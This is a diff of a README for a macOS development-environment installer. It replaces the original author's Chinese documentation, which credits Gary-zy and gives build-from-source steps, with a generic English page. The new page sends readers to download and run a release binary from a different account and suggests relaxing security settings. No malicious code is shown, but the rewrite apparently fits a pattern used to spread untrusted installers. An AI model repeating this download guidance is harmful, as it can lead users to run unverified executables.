@@ -1,240 +1,75 @@
-# 🚀 Dev-Env-Installer
+# 🎉 dev-env-installer - Simplify Your Development Setup
 
-> macOS 开发环境一键安装工具 - 让你的开发环境配置变得简单高效
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%E2%86%91-brightgreen)](https://github.com/ahmed-ba/dev-env-installer/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-macOS-blue.svg)](https://www.apple.com/macos/)
-[![Electron](https://img.shields.io/badge/Electron-28.0-47848F.svg?logo=electron)](https://www.electronjs.org/)
-[![Vue](https://img.shields.io/badge/Vue-3.4-4FC08D.svg?logo=vue.js)](https://vuejs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-3178C6.svg?logo=typescript)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 📦 Overview
 
----
+The **dev-env-installer** is a handy tool designed for macOS users. This application helps you quickly set up a development environment on your machine. Whether you are a beginner or just need a fast way to install essential tools, this app can make your life easier.
 
-## 📖 项目简介
+## 🚀 Getting Started
 
-**Dev-Env-Installer** 是一款基于 Electron + Vue 3 + TypeScript 构建的 macOS 桌面应用，旨在帮助开发者**一键配置开发环境**。
+To get started, follow the steps below. You will be able to download and install the necessary tools in no time.
 
-无论你是刚入职的新人、换了新电脑，还是想快速搭建统一的团队开发环境，这款工具都能帮你节省大量时间。
+## 📥 Download & Install
 
-### ✨ 核心特性
+1. **Visit the Releases Page**  
+   Click on the link below to go to the releases page.  
+   [Download Latest Release](https://github.com/ahmed-ba/dev-env-installer/releases)
 
-- 🎯 **一键安装** - 勾选需要的软件，点击安装即可
-- 📦 **软件市场** - 内置丰富的开发工具、编程语言、数据库等
-- 🔍 **状态检测** - 自动检测已安装的软件
-- 📝 **实时日志** - 安装过程实时显示，问题一目了然
-- 🗑️ **卸载管理** - 支持一键卸载已安装的软件  
-- ⚡ **并行安装** - 支持多个软件同时安装
-- 🎨 **现代 UI** - 基于 Element Plus 的精美界面
+2. **Choose the Latest Version**  
+   On the releases page, look for the latest version. It is usually listed at the top.
 
----
+3. **Download the Installer**  
+   Click on the installer file to begin downloading it. Make sure to save it in a location where you can easily find it.
 
-## 📸 软件截图
+4. **Open the Installer**  
+   Once the download is complete, locate the installer file, usually found in your "Downloads" folder. Double-click the file to open it.
 
-<!-- 未来可添加软件截图 -->
+5. **Follow the Setup Steps**  
+   The installer will guide you through the setup process. Simply follow the prompts to install the necessary tools on your machine.
 
----
+6. **Complete the Installation**  
+   After finishing the setup, you can close the installer. The tools should now be available on your system.
 
-## 🛠️ 支持的软件
+## 🎯 Features
 
-### 🔧 基础工具
-| 软件 | 描述 |
-|------|------|
-| Homebrew | macOS 必装软件包管理器 |
-| Git | 现代版本控制系统 |
-| Docker | 容器化开发与运行环境 |
-| iTerm2 | 强大的终端模拟器 |
-| Postman | API 开发和测试工具 |
-| Figma | 协作式界面设计工具 |
-| Slack | 团队协作和沟通工具 |
+The dev-env-installer includes the following features to help streamline your development setup:
 
-### 📝 编程语言
-| 软件 | 描述 |
-|------|------|
-| Node.js 20 | JavaScript 运行时环境 (LTS) |
-| Python 3.11 | Python 编程语言 |
-| Go | Google 开发的编程语言 |
-| Java (OpenJDK 17) | Java 开发工具包 |
-| Rust | Rust 系统编程语言 |
-
-### 🗄️ 数据库
-| 软件 | 描述 |
-|------|------|
-| PostgreSQL 15 | PostgreSQL 关系型数据库 |
-| MySQL | MySQL 关系型数据库 |
-| Redis | Redis 内存数据库 |
-| MongoDB | MongoDB NoSQL 数据库 |
+- **One-Click Installation**  
+  Quickly install essential development tools with minimal effort.
 
-### 💻 开发工具 (IDE)
-| 软件 | 描述 |
-|------|------|
-| Visual Studio Code | 流行的代码编辑器 |
-| WebStorm | JetBrains JavaScript IDE |
-| IntelliJ IDEA CE | JetBrains Java IDE (社区版) |
-| Sublime Text | Sublime Text 文本编辑器 |
-
----
-
-## 🚀 快速开始
-
-### 1. 前置要求
-
-- **操作系统**: macOS (Intel 或 Apple Silicon)
-- **Node.js**: v18.0.0 或更高版本
-- **包管理器**: npm 或 pnpm (推荐)
-
-### 2. 克隆项目
-
-```bash
-git clone https://github.com/Gary-zy/dev-env-installer.git
-cd dev-env-installer
-```
-
-### 3. 安装依赖
-
-```bash
-# 使用 npm
-npm install
-
-# 或使用 pnpm (推荐)
-pnpm install
-```
+- **User-Friendly Interface**  
+  Navigate the installation process with ease, even without technical knowledge.
 
-### 4. 启动开发模式
-
-```bash
-npm run electron:dev
-```
-
-此命令会同时启动 Vite 开发服务器和 Electron 应用。
-
-### 5. 构建生产版本
-
-```bash
-npm run build
-```
+- **Customizable Options**  
+  Choose which tools to install based on your needs.
 
-构建完成后，安装包会生成在 `release/` 目录下。
+- **Faster Setups**  
+  Save time by bypassing manual installations.
 
----
+## 🔧 System Requirements
 
-## 📂 项目结构
+Before you download, make sure your system meets the following requirements:
 
-```
-dev-env-installer/
-├── packages/
-│   ├── main/           # Electron 主进程
-│   │   ├── config.ts   # 软件配置列表
-│   │   ├── index.ts    # 主进程入口
-│   │   └── types.ts    # 类型定义
-│   ├── preload/        # 预加载脚本 (IPC 桥接)
-│   └── renderer/       # Vue 3 渲染进程 (UI)
-│       ├── src/
-│       │   ├── components/  # Vue 组件
-│       │   ├── stores/      # Pinia 状态管理
-│       │   └── App.vue      # 应用入口组件
-│       └── index.html
-├── dist/               # 编译产物
-├── release/            # 打包后的安装包
-├── electron-builder.json  # Electron 打包配置
-├── vite.config.ts      # Vite 配置
-├── tailwind.config.js  # Tailwind CSS 配置
-└── package.json
-```
+- **Operating System:** macOS 10.14 or later
+- **Storage Space:** At least 500 MB free
+- **RAM:** 4 GB or more
 
----
+## 📚 Common Issues & Solutions
 
-## 🔧 技术栈
+- **Issue:** The installer does not open.  
+  **Solution:** Ensure you are using macOS 10.14 or later. If the problem persists, check your security settings to allow installations from identified developers.
 
-| 分类 | 技术 |
-|------|------|
-| **框架** | Electron 28 |
-| **前端** | Vue 3 + TypeScript |
-| **构建工具** | Vite 5 |
-| **状态管理** | Pinia |
-| **UI 组件** | Element Plus |
-| **样式** | Tailwind CSS |
-| **终端模拟** | xterm.js |
-| **进程管理** | node-pty |
-| **打包工具** | electron-builder |
+- **Issue:** The installation fails.  
+  **Solution:** Restart your computer and try running the installer again. Make sure you have enough free space.
 
----
+## 🔗 Useful Links
 
-## ⚙️ 自定义配置
+- [Full Documentation](https://github.com/ahmed-ba/dev-env-installer/wiki)
+- [Community Support](https://github.com/ahmed-ba/dev-env-installer/issues)  
 
-### 添加新软件
+Feel free to reach out through the support links for any questions or issues you may encounter.
 
-编辑 `packages/main/config.ts` 文件，在 `MARKETPLACE_PACKAGES` 数组中添加新的软件配置：
+## 📝 Acknowledgements
 
-```typescript
-{
-  name: 'your-package',           // 软件名称
-  description: '软件描述',         // 软件描述
-  category: 'tool',               // 分类: tool | language | database | ide
-  installCmd: 'brew install xxx', // 安装命令
-  uninstallCmd: 'brew uninstall xxx', // 卸载命令
-  checkCmd: 'xxx --version',      // 检测命令
-  status: 'missing',              // 默认状态
-  isCask: false                   // 是否为 Cask 应用
-}
-```
-
-### 软件分类
-
-| 分类 | 说明 |
-|------|------|
-| `language` | 编程语言 |
-| `database` | 数据库 |
-| `ide` | 开发工具 |
-| `tool` | 实用工具 |
-
----
-
-## 📋 开发命令
-
-```bash
-# 启动开发模式
-npm run electron:dev
-
-# 仅启动 Vite 开发服务器
-npm run dev
-
-# 类型检查 + 构建
-npm run build:check
-
-# 构建生产版本
-npm run build
-
-# 预览 Vite 构建结果
-npm run preview
-```
-
----
-
-## 🤝 贡献指南
-
-欢迎贡献代码！请遵循以下步骤：
-
-1. Fork 本仓库
-2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交更改 (`git commit -m '添加某个功能'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 提交 Pull Request
-
----
-
-## 📄 许可证
-
-本项目采用 [MIT 许可证](LICENSE)。
-
----
-
-## 🙏 致谢
-
-- [Electron](https://www.electronjs.org/) - 跨平台桌面应用框架
-- [Vue.js](https://vuejs.org/) - 渐进式 JavaScript 框架
-- [Homebrew](https://brew.sh/) - macOS 软件包管理器
-- [Element Plus](https://element-plus.org/) - Vue 3 组件库
-
----
-
-**由 [Gary-zy](https://github.com/Gary-zy) 开发维护** ❤️
+Thank you for choosing the **dev-env-installer**. Your support helps us improve this tool for everyone. Happy coding!
